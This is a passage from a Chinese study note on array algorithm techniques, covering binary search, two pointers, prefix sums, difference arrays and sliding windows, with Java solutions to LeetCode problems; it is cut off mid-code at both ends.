&#123;            // 别返回，锁定右侧边界            left = mid + 1;        &#125;    &#125;    // 此时 left - 1 索引越界    if (left - 1 &lt; 0) return -1;    // 判断一下 nums[left] 是不是 target    return nums[left - 1] == target ? (left - 1) : -1;&#125;\n\n应用\nleetcode-34 在排序数组中查找元素的第一个和最后一个位置\n\n\n\n两数之和\n本质思想和二分查找一样的，通过移动左右指针来调节 sum 向目标值靠拢\n应用：\n\nleetcode-167 两数之和 II - 输入有序数组\npublic int[] twoSum(int[] numbers, int target) &#123;        int left = 0, right = numbers.length - 1;        while(left &lt; right) &#123;            int sum = numbers[left] + numbers[right];            if (sum == target) &#123;                return new int[] &#123;left+1, right+1&#125;;            &#125; else if (sum &lt; target) &#123;                left++;            &#125; else if (sum &gt; target) &#123;                right--;            &#125;        &#125;        return new int[] &#123;-1, -1&#125;;    &#125;\n\n剑指 Offer 57. 和为s的两个数字\n\n剑指 Offer II 006. 排序数组中两个数字之和\n\nleetcode-1 两数之和\n这道题比较坑的是需要先排序，但是就会丢失原来元素的下标信息，因此需要额外的数据结构来保存下标信息\n二分法对于这道题不是最优解\nstatic class tuple &#123;        int val;        int index;    &#125;    public int[] twoSum(int[] nums, int target) &#123;        tuple[] temp = new tuple[nums.length];        for (int i = 0; i &lt; nums.length; i++) &#123;            temp[i] = new tuple();            temp[i].val = nums[i];            temp[i].index = i;        &#125;        Arrays.sort(temp, (x, y) -&gt; (x.val - y.val));        int left = 0, right = nums.length - 1;        while(left &lt; right) &#123;            int sum = temp[left].val + temp[right].val;            if (sum &lt; target) &#123;               left++;            &#125; else if (sum &gt; target) &#123;                right--;            &#125; else if (sum == target) &#123;                return new int[] &#123;temp[left].index, temp[right].index&#125;;            &#125;        &#125;        return new int[] &#123;&#125;;    &#125;\n\n\n\n反转数组\n同理左右指针相向而行，边走边交换值\n应用：\n\nleetcode-344 反转字符串\n\npublic void reverseString(char[] s) &#123;        int left = 0, right = s.length - 1;        while(left &lt; right) &#123;            char temp = s[left];            s[left] = s[right];            s[right] = temp;            left++;            right--;        &#125;    &#125;\n\n回文串判断\n应用：\n\nleetcode-5 最长回文子串\n这里算法核心在于从中心向两端扩散的双指针技巧\n这里的“中心”我们可以任意选择，左右指针从它开始向两边移动。同时，考虑“中心”为奇数点和偶数点的情况\n首先是中心展开\nprivate String Palindrome(String s, int l, int r) &#123;        while(l &gt;= 0 &amp;&amp; r &lt; s.length() &amp;&amp; s.charAt(l) == s.charAt(r)) &#123;            l--;             r++;        &#125;        return s.substring(l + 1, r);    &#125;\n然后就是遍历每一个“中心”，寻找最长回文串\npublic String longestPalindrome(String s) &#123;        String res = &quot;&quot;;                for (int i = 0; i &lt; s.length(); i++) &#123;            // 奇数回文串            String res1 = Palindrome(s, i, i);            // 偶数回文串            String res2 = Palindrome(s, i, i + 1);            res = res.length() &gt; res1.length() ? res : res1;            res = res.length() &gt; res2.length() ? res : res2;        &#125;        return res;    &#125;\n\n\n\n\n前缀和\n前缀和技巧适用于快速、频繁地计算一个索引区间内的元素之和\n\n\nleetcode-303 区域和检索 - 数组不可变\n传统我们统计一个区间内元素和就是通过遍历一遍然后累计求和，时间复杂度为 O(N) ，如果多次调用则很费时间。一个技巧就是提前求和前缀和：维护一个前缀和数组 preSum 出来，preSum[i] 记录 nums[0..i-1] 的累加和\n\n要求某个区间和时，只需要作差即可，时间复杂度降为 O(1)\nclass NumArray &#123;    private int[] preNum;    public NumArray(int[] nums) &#123;        preNum = new int[nums.length + 1];        preNum[0] = 0;        for (int i = 1; i &lt; nums.length + 1; i++) &#123;            preNum[i] = preNum[i-1] + nums[i-1];        &#125;    &#125;        public int sumRange(int left, int right) &#123;        return preNum[right + 1] - preNum[left];    &#125;&#125;\nleetcode-724 寻找数组的中心下标\n直接利用前缀和即可，考虑边界情况\nclass Solution &#123;    int[] preNums;    public int pivotIndex(int[] nums) &#123;        preNums = new int[nums.length + 1];        preNums[0] = 0;        for (int i = 1; i &lt; preNums.length; i++) &#123;            preNums[i] = preNums[i-1] + nums[i-1];        &#125;        for (int i = 0; i &lt; nums.length; i++) &#123;            int leftSum, rightSum;            if (i == 0) &#123;                leftSum = 0;            &#125; else &#123;                leftSum = getSum(0, i - 1);            &#125;            if (i == nums.length - 1) &#123;                rightSum = 0;            &#125; else &#123;                rightSum = getSum(i+1, nums.length - 1);            &#125;            if (leftSum == rightSum) &#123;                return i;            &#125;        &#125;        return -1;    &#125;    private int getSum(int i, int j) &#123;        return preNums[j+1] - preNums[i];    &#125;&#125;\n\n二维矩阵中的前缀和 leetcode-304 二维区域和检索 - 矩阵不可变\n观察下图可知，一个矩阵和可由多个大的矩阵组合运算得到，而这几个大矩阵的共同点都是以原点作为起点\n\n那么我们完全可以计算所有以原点为起点的前缀和矩阵，用的时候将他们组合运算即可\nclass NumMatrix &#123;    private int[][] preMatrix;    public NumMatrix(int[][] matrix) &#123;        int m = matrix.length;        int n = matrix[0].length;        preMatrix = new int[m + 1][n + 1];        if (m == 0 &amp;&amp; n == 0) &#123;            return;        &#125;        for (int i = 1; i &lt; m + 1; i++) &#123;            for (int j = 1; j &lt; n + 1; j++) &#123;                preMatrix[i][j] = preMatrix[i-1][j] + preMatrix[i][j-1] + matrix[i-1][j-1] - preMatrix[i-1][j-1];            &#125;        &#125;    &#125;        public int sumRegion(int row1, int col1, int row2, int col2) &#123;        return preMatrix[row2+1][col2+1] - preMatrix[row2+1][col1] - preMatrix[row1][col2+1] + preMatrix[row1][col1];    &#125;&#125;\n\nleetcode-1314 矩阵区域和\n思路基本和上题一样，需要注意下标越界问题\nclass Solution &#123;    int[][] preMatrix;    public int[][] matrixBlockSum(int[][] mat, int k) &#123;        int m = mat.length, n = mat[0].length;        if (m == 0 &amp;&amp; n == 0) return null;        preMatrix = new int[m + 1][n + 1];        for (int i = 1; i &lt; m + 1; i++) &#123;            for (int j = 1; j &lt; n + 1; j++) &#123;                preMatrix[i][j] = preMatrix[i-1][j] + preMatrix[i][j-1] + mat[i-1][j-1] - preMatrix[i-1][j-1];            &#125;        &#125;        int[][] answer = new int[m][n];        for (int i = 0; i &lt; m; i++) &#123;            for (int j = 0; j &lt; n; j++) &#123;                // 防止数组越界                int row1 = Math.max(i-k, 0);                int col1 = Math.max(j-k, 0);                int row2 = Math.min(i+k, m-1);                int col2 = Math.min(j+k, n-1);                answer[i][j] = sum(row1, col1, row2, col2);            &#125;        &#125;        return answer;    &#125;    private int sum(int row1, int col1, int row2, int col2) &#123;        return preMatrix[row2+1][col2+1] - preMatrix[row1][col2+1] - preMatrix[row2+1][col1] + preMatrix[row1][col1];    &#125;&#125;\n\n前缀积\nleetcode-238 除自身以外数组的乘积\n这里的思想和前缀和数组很类似，通过构造前缀积和后缀积，两个相乘就是除自身以外数组的乘积\npublic int[] productExceptSelf(int[] nums) &#123;        int length = nums.length;        int[] preix = new int[length];        preix[0] = nums[0];        for (int i = 1; i &lt; length; i++) &#123;            preix[i] = preix[i-1] * nums[i];        &#125;        int[] suffix = new int[length];        suffix[length - 1] = nums[length - 1];        for (int i = length - 2; i &gt;= 0; i--) &#123;            suffix[i] = suffix[i+1] * nums[i];        &#125;        int[] answer = new int[length];  \t\t\t// 边界情况        answer[0] = suffix[1];        answer[length - 1] = preix[length - 2];        for (int i = 1; i &lt; length - 1; i++) &#123;            answer[i] = preix[i-1] * suffix[i+1];        &#125;        return answer;    &#125;\n\n前缀和 + 哈希表\n前面都是给定索引区间去求前缀和，那么给定前缀和如何去求解索引区间？\n这里就要借助哈希表来维护每一个前缀和的索引\n我们已知 target = preSum[j] - preSum[i]，也就是说只要哈希表中维护了索引的映射关系，那么遍历 i 或 j (这里以 j 为例) \npreSum[i] = target - preSum[j] 只要每次去判断是否存在 i 的映射即可\n🚩leecode-525 连续数组\n这题的解法十分巧妙，数量相同可以转为和为0的最长子数组，也就是将 0 元素转为值为 -1 。这样就可以用前缀和的思路，配合哈希表记录前缀和的值\nclass Solution &#123;    private int[] prefix;    public int findMaxLength(int[] nums) &#123;        int len = nums.length;        prefix = new int[len + 1];        prefix[0] = 0;        for (int i = 1; i &lt; len + 1; i++) &#123;            prefix[i] = prefix[i-1] + (nums[i-1] == 0 ? -1 : 1);        &#125;        HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();        int res = 0;        for (int i = 0; i &lt; prefix.length; i++) &#123;            if (!map.containsKey(prefix[i])) &#123;                map.put(prefix[i], i);            &#125; else &#123;                // 说明出现了和 0 的子数组                res = Math.max(res, i - map.get(prefix[i]));            &#125;        &#125;        return res;    &#125;&#125;\nleetcode-523 连续的子数组和\n求解条件可以转换为：寻找 i, j 使得 (preSum[i] - preSum[j]) % k == 0 且 i - j &gt;= 2\n也就是 preSum[i] 和 preSum[j] 模 k 同余\nclass Solution &#123;    private int[] prefix;    public boolean checkSubarraySum(int[] nums, int k) &#123;        int len = nums.length;        prefix = new int[len + 1];        prefix[0] = 0;        for(int i = 1; i &lt; prefix.length; i++) &#123;            prefix[i] = prefix[i-1] + nums[i-1];        &#125;        HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();        for (int i = 0; i &lt; prefix.length; i++) &#123;            if (!map.containsKey(prefix[i] % k)) &#123;                map.put(prefix[i] % k, i);            &#125; else if ((i - map.get(prefix[i] % k)) &gt;= 2) &#123;                return true;            &#125;        &#125;        return false;    &#125;&#125;\nleetcode-560 和为 K 的子数组\n这道题关键是我需要知道对于当前的 prefix，它的 need = prefix - k\n是否存在且存在多少个。因此区别于前面几题，这题需要提前维护一个记录 need 值和出现个数的 map \nclass Solution &#123;    private int[] prefix;    public int subarraySum(int[] nums, int k) &#123;        int len = nums.length;        prefix = new int[len + 1];        prefix[0] = 0;        HashMap&lt;Integer, Integer&gt; count = new HashMap&lt;&gt;();        count.put(0, 1);        int res = 0; // 总子数组个数        for (int i = 1; i &lt; prefix.length; i++) &#123;            prefix[i] = prefix[i-1] + nums[i-1];            // 对于该前缀和，还需多少来满足和为 k            int need = prefix[i] - k;            if (count.containsKey(need)) &#123;                res += count.get(need);            &#125;            if (!count.containsKey(prefix[i])) &#123;                count.put(prefix[i], 1);            &#125; else &#123;                count.put(prefix[i], count.get(prefix[i]) + 1);            &#125;        &#125;        return res;    &#125;&#125;\nleetcode-325 和等于 k 的最长子数组长度\n这题就是传统的前缀和 + 哈希表，有个细节是为什么哈希表里只需记录第一次出现该前缀和时所对应的索引呢？因为体面给的是最长子数组长度，第一次出现的肯定最长\nclass Solution &#123;    private int[] prefix;    public int maxSubArrayLen(int[] nums, int k) &#123;        int len = nums.length;        prefix = new int[len + 1];        prefix[0] = 0;                for (int i = 1; i &lt; prefix.length; i++) &#123;            prefix[i] = prefix[i-1] + nums[i-1];        &#125;        HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();        int res = 0;        for (int i = 0; i &lt; prefix.length; i++) &#123;            if (map.containsKey(prefix[i]-k)) &#123;                res = Math.max(res, i - map.get(prefix[i]-k));            &#125;            if (!map.containsKey(prefix[i])) &#123;                map.put(prefix[i], i);            &#125;        &#125;        return res;    &#125;&#125;\nleetcode-974 和可被 K 整除的子数组\n这里和前面求 和为 k 的子数组个数 差不多，这里是维护同余的值与个数的 map，需要注意的是这里的在求余数时要考虑变成负数的情况\nclass Solution &#123;    private int[] prefix;    public int subarraysDivByK(int[] nums, int k) &#123;        int len = nums.length;        prefix = new int[len + 1];        prefix[0] = 0;                HashMap&lt;Integer, Integer&gt; count = new HashMap&lt;&gt;();        count.put(0, 1);                int res = 0;        for (int i = 1; i &lt; prefix.length; i++) &#123;            prefix[i] = prefix[i-1] + nums[i-1];          // 可能是负数            int remainder = (prefix[i] % k) &lt; 0 ? prefix[i] % k + k : prefix[i] % k;            if (count.containsKey(remainder)) &#123;                res += count.get(remainder);                count.put(remainder, count.get(remainder) + 1);            &#125; else &#123;                count.put(remainder, 1);            &#125;        &#125;        return res;    &#125;&#125;\n🚩leetcode-1124 表现良好的最长时间段 \n首先第一个转化点：以 8 为分界线，大于部分取 1，小于等于部分取 -1，以此问题就转化成了求和问题，只需要找子数组和满足大于 0 的最长数组即可\n仍然利用前缀和 + 哈希表的方式，因为这里是求最长子数组且并没有给定求和值，所以求解方向就是求和满足最低要求使得数组范围仅可能大\nclass Solution &#123;    private int[] prefix;    public int longestWPI(int[] hours) &#123;        int len = hours.length;        prefix = new int[len + 1];        prefix[0] = 0;        HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();        int res = 0;        for (int i = 1; i &lt; prefix.length; i++) &#123;            prefix[i] = prefix[i-1] + (hours[i-1] &gt; 8 ? 1 : -1);                    if (!map.containsKey(prefix[i])) &#123;                map.put(prefix[i], i);            &#125;            // 讨论 prefix[i] 的情况            if (prefix[i] &gt; 0) &#123;                res = Math.max(res, i);            &#125; else &#123;                // prefix[i] - prefix[j] &gt; 0 且 j 要尽可能小                if (map.containsKey(prefix[i] - 1)) &#123;                    res = Math.max(res, i - map.get(prefix[i] - 1));                &#125;            &#125;        &#125;        return res;    &#125;&#125;\n\n\n差分数组与前缀和类似，差分数组构建的目的是解决频繁对数组进行增减操作的效率问题\n解决问题是构建一个差分数组，每个差分数组元素都是元素数对应位置与前一位置的差值，这已然可以想到对差值做增减将会反应的一整个范围原数组的值\n\n\nex. 如果你想对区间 nums[i..j] 的元素全部加 3，那么只需要让 diff[i] += 3，然后再让 diff[j+1] -= 3 即可:\n\n\n因此这里封装一个差分数组类：\npublic class DifferenceArray &#123;    private int[] diff;    public DifferenceArray(int[] nums) &#123;        assert nums.length &gt; 0;        diff = new int[nums.length];        // 构建差分数组        diff[0] = nums[0];        for (int i = 1; i &lt; nums.length; i++) &#123;            diff[i] = nums[i] - nums[i-1];        &#125;    &#125;    // 也可以是加负数    public void increment(int i, int j, int val) &#123;        diff[i] += val;        // 如果大于等于则说明是对从 i 到结尾整个数组做操作        if (j + 1 &lt; diff.length) &#123;            diff[j+1] -= val;        &#125;    &#125;    // 还原结果数组    public int[] result() &#123;        int[] res = new int[diff.length];        res[0] = diff[0];        for (int i = 1; i &lt; diff.length; i++) &#123;            res[i] = res[i - 1] + diff[i];        &#125;        return res;    &#125;&#125;\n应用：\n\nleetcode-370 区间加法\n直接应用即可\nclass Solution &#123;    private int[] diff;    private void inc(int i, int j, int val) &#123;        diff[i] += val;        if (j + 1 &lt; diff.length) &#123;            diff[j + 1] -= val;        &#125;    &#125;    private int[] result() &#123;        int[] result = new int[diff.length];        result[0] = diff[0];        for (int i = 1; i &lt; diff.length; i++) &#123;            result[i] = result[i-1] + diff[i];        &#125;        return result;    &#125;    public int[] getModifiedArray(int length, int[][] updates) &#123;        if (length == 0) &#123;            return null;        &#125;                diff = new int[length];        for (int[] update : updates) &#123;            int i = update[0];            int j = update[1];            int val = update[2];            inc(i, j, val);        &#125;        int[] res = result();        return res;    &#125;&#125;\n\nleetcode-1109 航班预订统计\n本质上仍然是差分数组操作\nclass Solution &#123;    private int[] diff;    private void inc(int i, int j, int val) &#123;        diff[i] += val;        if (j + 1 &lt; diff.length) &#123;            diff[j + 1] -= val;        &#125;    &#125;    private int[] result() &#123;        int[] res = new int[diff.length];        res[0] = diff[0];        for (int i = 1; i &lt; diff.length; i++) &#123;            res[i] = res[i-1] + diff[i];        &#125;        return res;    &#125;    public int[] corpFlightBookings(int[][] bookings, int n) &#123;        diff = new int[n];        for (int[] booking : bookings) &#123;            int i = booking[0];            int j = booking[1];            int val = booking[2];            inc(i-1, j-1, val);        &#125;        int[] res = result();        return res;    &#125;&#125;\n\nleetcode-1094 拼车\n这里需要注意细节是下车的位置人数已经减少，所以这个区间增减区间应该是左闭右开的\nclass Solution &#123;    private int[] diff;    private void inc(int i, int j, int val) &#123;        diff[i] += val;        if (j + 1 &lt; diff.length) &#123;            diff[j + 1] -= val;        &#125;    &#125;    public boolean carPooling(int[][] trips, int capacity) &#123;        diff = new int[1000];        int[] seats = new int[1001];        for (int i = 0; i &lt; seats.length; i++) &#123;            seats[i] = capacity;        &#125;        for (int[] trip : trips) &#123;            int i = trip[1];            int j = trip[2] - 1;            int val = trip[0];            inc(i, j, val);        &#125;        seats[0] = diff[0];        if (seats[0] &gt; capacity) &#123;            return false;        &#125;                for (int i = 1; i &lt; diff.length; i++) &#123;            seats[i] = seats[i-1] + diff[i];            if (seats[i] &gt; capacity) &#123;                return false;            &#125;        &#125;        return true;    &#125;&#125;\n\n\n更抽象问题的套路框架：\n// 函数 f 是关于自变量 x 的单调函数int f(int x) &#123;    // ...&#125;// 主函数，在 f(x) == target 的约束下求 x 的最值int solution(int[] nums, int target) &#123;    if (nums.length == 0) return -1;    // 问自己：自变量 x 的最小值是多少？    int left = ...;    // 问自己：自变量 x 的最大值是多少？    int right = ... + 1;    while (left &lt; right) &#123;        int mid = left + (right - left) / 2;        if (f(mid) == target) &#123;            // 问自己：题目是求左边界还是右边界？            // ...        &#125; else if (f(mid) &lt; target) &#123;            // 问自己：怎么让 f(x) 大一点？            // ...        &#125; else if (f(mid) &gt; target) &#123;            // 问自己：怎么让 f(x) 小一点？            // ...        &#125;    &#125;    return left;&#125;\n\nleetcode-875 爱吃香蕉的珂珂\n首先自变量是吃香蕉速度，因变量根据题意可知是吃完所需的时间。\n最小速度 k 表明要求左边界，但这里注意时间与速度之间呈反比关系\nclass Solution &#123;    private int f(int[] piles, int x) &#123;        // 因变量为按 x 速度吃香蕉所需时间        int hours = 0;        for (int i = 0; i &lt; piles.length; i++) &#123;            hours += piles[i] / x;            if (piles[i] % x != 0) &#123;                hours++;            &#125;        &#125;        return hours;    &#125;    public int minEatingSpeed(int[] piles, int h) &#123;        int left = 1, right = 1000000000 + 1;        while(left &lt; right) &#123;            int mid = left + (right - left) / 2;            // 单减函数            if (f(piles, mid) &gt; h) &#123;                left = mid + 1;            &#125; else if (f(piles, mid) &lt;= h) &#123;                right = mid;            &#125;        &#125;        return left;    &#125;&#125;\n\nleetcode-1011 在 D 天内送达包裹的能力\n二分部分好说，感觉天数那里不好算\nclass Solution &#123;    private int getDays(int[] weights, int x) &#123;        int days = 0;        int tmp = 0;        for (int i = 0; i &lt; weights.length; i++) &#123;            tmp += weights[i];            if (tmp &gt; x) &#123;                days++;                tmp = weights[i];            &#125;                    &#125;        return days + 1;    &#125;    public int shipWithinDays(int[] weights, int days) &#123;        int left = 0;        for (int i = 0; i &lt; weights.length; i++) &#123;            left = Math.max(left, weights[i]);        &#125;        int right = 25000000 + 1;        while(left &lt; right) &#123;            int mid = left + (right - left) / 2;            if (getDays(weights, mid) &gt; days) &#123;                left = mid + 1;            &#125; else &#123;                right = mid;            &#125;        &#125;        return left;    &#125;&#125;\n\n🚩leetcode-410 分割数组的最大值\n这里主要是思维的转换，仔细一想发现这道题其实本质上和前面运输船的问题是一样的。分成 m 个非空的连续子数组就是就是在 m 天运完所有货物；子数组对应着每天运输的货物量；而子数组和的最小值就是对应着最小载重\n\n\n在二维矩阵中的应用：\n\nleetcode-74 搜索二维矩阵\n这道题如果想用二分搜索，需要先转换为一维数组的索引形式\n已知 二维数组的坐标 (i, j) 可以映射成一维的 index = i * n + j (二维数组的的行数 m 和列数 n)，那么 通过一维 index 反解出二维坐标 i = index / n, j = index % n\nclass Solution &#123;    public boolean searchMatrix(int[][] matrix, int target) &#123;        int m = matrix.length, n = matrix[0].length;            int left = 0, right = m * n - 1;        while (left &lt;= right) &#123;            int mid = left + (right - left) / 2;            if (get(matrix, mid) == target) &#123;                return true;            &#125; else if (get(matrix, mid) &gt; target) &#123;                right = mid - 1;            &#125; else if (get(matrix, mid) &lt; target) &#123;                left = mid + 1;            &#125;        &#125;        return false;    &#125;    private int get(int[][] matrix, int index) &#123;        int m = matrix.length, n = matrix[0].length;        int i = index / n, j = index % n;        return matrix[i][j];    &#125;&#125;\n\nleetcode-240 搜索二维矩阵 II\n这题巧妙方法在于我们可以将起点设置在右上角或者左下角，因为这样设置的话，朝两个方向走将要么增大要么减小，如此我们便可参考二分搜索的思路，根据与目标值作比较来决定是往元素变大的方向走还是往元素变小的方向走\npublic boolean searchMatrix(int[][] matrix, int target) &#123;        int m = matrix.length, n = matrix[0].length;        int i = 0, j = n - 1;        while (i &lt; m &amp;&amp; j &gt;= 0) &#123;            if (matrix[i][j] == target) &#123;                return true;            &#125; else if (matrix[i][j] &gt; target) &#123;                j--;            &#125; else if (matrix[i][j] &lt; target) &#123;                i++;            &#125;        &#125;        return false;    &#125;\n「最接近元素」问题\n\nleetcode-658 找到 K 个最接近的元素\n这里首先用到二分查找的思路来定位目标元素，我们在这里定位左边界，因为根据题意 |a - x| == |b - x| 且 a &lt; b 是想让我们的下标尽量小；其次，利用「最长回文子串」的思想来从中心向两端扩张符合条件的元素直至已得到 K 个元素\n注意这里利用 LinkedList 来保证结果的升序特性\nclass Solution &#123;    public List&lt;Integer&gt; findClosestElements(int[] arr, int k, int x) &#123;        int p = findBinSearch(arr, x);        // 这里设置成开区间        int left = p - 1, right = p;        LinkedList&lt;Integer&gt; res = new LinkedList&lt;&gt;();        while(right - left - 1 &lt; k) &#123;            if (left == -1) &#123;                res.addLast(arr[right]);                right++;            &#125; else if (right == arr.length) &#123;                res.addFirst(arr[left]);                left--;            &#125; else if (x - arr[left] &gt; arr[right] - x) &#123;                res.addLast(arr[right]);                right++;            &#125; else &#123;                res.addFirst(arr[left]);                left--;            &#125;        &#125;        return res;    &#125;    // 升序    private int findBinSearch(int[] arr, int target) &#123;        int left = 0, right = arr.length;        while(left &lt; right) &#123;            int mid = left + (right - left) / 2;            if (arr[mid] == target) &#123;                right = mid;            &#125; else if (arr[mid] &gt; target) &#123;                right = mid;            &#125; else if (arr[mid] &lt; target) &#123;                left = mid + 1;            &#125;        &#125;                return left;    &#125;&#125;\n「寻找峰值」\n\nleetcode-162 寻找峰值\nleetcode-852 山脉数组的峰顶索引\n这里如何采用二分搜索的思想呢？也就是我们需要一个判定条件来移动我们的左右边界。我们可以根据探测值和周围的走势来判断：\n\n如果走势下行（nums[mid] &gt; nums[mid+1]），说明 mid 本身就是峰值或其左侧有一个峰值，所以需要收缩右边界（right = mid）；\n如果走势上行（nums[mid] &lt; nums[mid+1]），则说明 mid 右侧有一个峰值，需要收缩左边界（left = mid + 1）\n\npublic int findPeakElement(int[] nums) &#123;        int left = 0, right = nums.length - 1;        // 终止条件：left == right        while (left &lt; right) &#123;            int mid = left + (right - left) / 2;            if (nums[mid] &gt; nums[mid + 1]) &#123;                // 左侧可能是高峰                right = mid;            &#125; else &#123;                left = mid + 1;            &#125;        &#125;        return left;    &#125;\n\n剑指 Offer 53 - I. 在排序数组中查找数字 I\n这个题就是寻找出来左右边界即可\nclass Solution &#123;    public int search(int[] nums, int target) &#123;        int l = leftBound(nums, target), r = rightBound(nums, target);        if (l == -1) &#123;            return 0;        &#125; else &#123;            return r - l + 1;        &#125;    &#125;    private int leftBound(int[] nums, int target) &#123;        int left = 0, right = nums.length;        while(left &lt; right) &#123;            int mid = left + (right - left) / 2;            if (nums[mid] == target) &#123;                right = mid;            &#125; else if (nums[mid] &gt; target) &#123;                right = mid;            &#125; else if (nums[mid] &lt; target) &#123;                left = mid + 1;            &#125;        &#125;        if (left == nums.length) &#123;                return -1;            &#125;            return nums[left] == target ? left : -1;    &#125;    private int rightBound(int[] nums, int target) &#123;        int left = 0, right = nums.length;        while(left &lt; right) &#123;            int mid = left + (right - left) / 2;            if (nums[mid] == target) &#123;                left = mid + 1;            &#125; else if (nums[mid] &gt; target) &#123;                right = mid;            &#125; else if (nums[mid] &lt; target) &#123;                left = mid + 1;            &#125;        &#125;                if (left - 1 &lt; 0) &#123;                return -1;            &#125;        return nums[left - 1] == target ? left - 1 : -1;    &#125;&#125;\n\n剑指 Offer 53 - II. 0～n-1中缺失的数字\n传统做法：一次遍历，当然要考虑最后一个元素的情况\npublic int missingNumber(int[] nums) &#123;        int i;        for (i = 0; i &lt; nums.length; i++) &#123;            if (i != nums[i]) &#123;                return i;            &#125;        &#125;        return i;    &#125;\n如果用二分法的话，实际上是一次排出一般的数组元素，如何寻找判定条件？根据传统做法的思路，判断 nums[mid] 和 mid 的关系即可：\n\n如果 nums[mid] 和 mid 相等，则缺失的元素在右半边，如果 nums[mid] 和 mid 不相等，则缺失的元素在左半边\n\n考虑最后一个元素的情况，所以这里用搜索左边界的方式\npublic int missingNumber(int[] nums) &#123;        int left = 0, right = nums.length;        while(left &lt; right) &#123;            int mid = left + (right - left) / 2;            if (nums[mid] == mid) &#123;                left = mid + 1;            &#125; else &#123;                right = mid;            &#125;        &#125;        return left;    &#125;\n\nleetcode-33 搜索旋转排序数组\n可以看到如图所示的情况，通过比较 mid 和左右边界的值即可判断当前 mid 落在左半部分还是右半部分；进一步再去判断 target 是落在了左半部分还是右半部分，来收缩左右边界。搜索方式和二分查找思路一样\n\npublic int search(int[] nums, int target) &#123;        int left = 0, right = nums.length -1;        while (left &lt;= right) &#123;            int mid = left + (right - left) / 2;            if (target == nums[mid]) &#123;                return mid;            &#125;            // 左半边            if (nums[left] &lt;= nums[mid]) &#123;                if (nums[left] &lt;= target &amp;&amp; target &lt; nums[mid]) &#123;                    right = mid - 1;                &#125; else &#123;                    left = mid + 1;                &#125;            &#125; else &#123;                if (target &gt; nums[mid] &amp;&amp; target &lt;= nums[right]) &#123;                    left = mid + 1;                &#125; else &#123;                    right = mid - 1;                &#125;            &#125;        &#125;        return -1;    &#125;\n\nleetcode-81 搜索旋转排序数组 II\n我们直接用上题的代码尝试，如下出错\n\n原因即在于左右出现重复的部分，导致 mid 在判断左右区间时出错，而第二步就无法继续了。解决方法即我们先把重复元素去除，即开始时左右区间就向中间收缩，直至不存在重复元素为止（针对左半部分/ 右半部分而言）\n\npublic boolean search(int[] nums, int target) &#123;        int left = 0, right = nums.length -1;// 收缩左边界        while (left &lt; right &amp;&amp; nums[left] == nums[left+1]) &#123;            left++;        &#125;// 收缩右边界        while (left &lt; right &amp;&amp; nums[right] == nums[right-1]) &#123;            right--;        &#125;        while (left &lt;= right) &#123;            int mid = left + (right - left) / 2;            if (target == nums[mid]) &#123;                return true;            &#125;            // 左半边            if (nums[left] &lt;= nums[mid]) &#123;                if (nums[left] &lt;= target &amp;&amp; target &lt; nums[mid]) &#123;                    right = mid - 1;                &#125; else &#123;                    left = mid + 1;                &#125;            &#125; else &#123;                if (target &gt; nums[mid] &amp;&amp; target &lt;= nums[right]) &#123;                    left = mid + 1;                &#125; else &#123;                    right = mid - 1;                &#125;            &#125;        &#125;        return false;    &#125;\n\n\n滑动窗口算法技巧算法框架：\n/* 滑动窗口算法框架 */void slidingWindow(String s) &#123;    Map&lt;Character, Integer&gt; window = new HashMap&lt;&gt;();        int left = 0, right = 0;    while (right &lt; s.length()) &#123;        // c 是将移入窗口的字符        char c = s.charAt(right);        // 增大窗口        right++;        // 进行窗口内数据的一系列更新        ...        /*** debug 输出的位置 ***/        // 注意在最终的解法代码中不要 print        // 因为 IO 操作很耗时，可能导致超时        System.out.printf(&quot;window: [%d, %d)\\n&quot;, left, right);        /********************/                // 判断左侧窗口是否要收缩        while (window needs shrink) &#123;            // d 是将移出窗口的字符            char d = s.charAt(left);            // 缩小窗口            left++;            // 进行窗口内数据的一系列更新            ...        &#125;    &#125;&#125;\n算法步骤：\n\n1、我们在字符串 S 中使用双指针中的左右指针技巧，初始化 left = right = 0，把索引左闭右开区间 [left, right) 称为一个「窗口」。\n理论上你可以设计两端都开或者两端都闭的区间，但设计为左闭右开区间是最方便处理的。因为这样初始化 left = right = 0 时区间 [0, 0) 中没有元素，但只要让 right 向右移动（扩大）一位，区间 [0, 1) 就包含一个元素 0 了。如果你设置为两端都开的区间，那么让 right 向右移动一位后开区间 (0, 1) 仍然没有元素；如果你设置为两端都闭的区间，那么初始区间 [0, 0] 就包含了一个元素。这两种情况都会给边界处理带来不必要的麻烦。\n2、我们先不断地增加 right 指针扩大窗口 [left, right)，直到窗口中的字符串符合要求（包含了 T 中的所有字符）。\n3、此时，我们停止增加 right，转而不断增加 left 指针缩小窗口 [left, right)，直到窗口中的字符串不再符合要求（不包含 T 中的所有字符了）。同时，每次增加 left，我们都要更新一轮结果。\n4、重复第 2 和第 3 步，直到 right 到达字符串 S 的尽头。\n这个思路其实也不难，第 2 步相当于在寻找一个「可行解」，然后第 3 步在优化这个「可行解」，最终找到最优解，也就是最短的覆盖子串。左右指针轮流前进，窗口大小增增减减，窗口不断向右滑动，这就是「滑动窗口」这个名字的来历。\n\n应用\n\nleetcode-76 最小覆盖子串\n这里注意需要一个初始 len 来排除未找到符合条件的子串的情况\npublic String minWindow(String s, String t) &#123;        // 统计 t 中字符        HashMap&lt;Character, Integer&gt; need = new HashMap&lt;&gt;();        for (int i = 0; i &lt; t.length(); i++) &#123;            char c = t.charAt(i);            need.put(c, need.getOrDefault(c, 0) + 1);        &#125;        HashMap&lt;Character, Integer&gt; window = new HashMap&lt;&gt;();        int left = 0, right = 0;\t\t// 记录最小覆盖子串的起始索引及长度        int start = 0, len = Integer.MAX_VALUE;        // 满足子串字符要求的个数        int valid = 0;        while (right &lt; s.length()) &#123;          // c 是将移入窗口的字符            char c = s.charAt(right);          // 扩大窗口            right++;          // 进行窗口内数据的一系列更新            if (need.containsKey(c)) &#123;                window.put(c, window.getOrDefault(c, 0) + 1);                if (need.get(c).equals(window.get(c))) &#123;                  // 只有当 window[c] 和 need[c] 对应的出现次数一致时，才能满足条件，valid 才能 +1                    valid++;                &#125;            &#125; // 判断左侧窗口是否要收缩            while (valid == need.size()) &#123;                // 更新最优值                if (right - left &lt; len) &#123;                    start = left;                    len = right - left;                &#125;// d 是将移出窗口的字符                char d = s.charAt(left);              // 缩小窗口                left++;              // 进行窗口内数据的一系列更新                if (need.containsKey(d)) &#123;                    if 